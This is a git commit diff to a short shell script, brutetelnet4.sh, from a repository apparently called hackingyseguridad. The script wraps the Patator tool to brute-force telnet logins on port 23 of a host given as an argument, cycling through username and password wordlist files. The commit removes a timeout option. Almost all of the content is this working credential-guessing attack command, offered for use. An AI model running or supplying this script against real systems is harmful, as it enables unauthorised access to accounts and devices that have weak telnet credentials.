7275e98ba596c7b6d9191a5be9bc786a18570d20
hackingyseguridad <antonio_taboada@hotmail.es>
2024-06-06 17:49:25 +0200

    Update brutetelnet4.sh

--- brutetelnet4.sh
+++ brutetelnet4.sh
@@ -4,4 +4,4 @@ echo
 echo "https://github.com/lanjelot/patator"
 echo "patator telnet_login host=1.1.1.1 user=antonio password=Passwd01"
 echo "hackingyseguridad.com 2024"
-patator telnet_login host=$1 user=FILE0 password=FILE1 0=usuarios0.txt 1=claves0.txt timeout=3 port=23
+patator telnet_login host=$1 user=FILE0 password=FILE1 0=usuarios0.txt 1=claves0.txt port=23
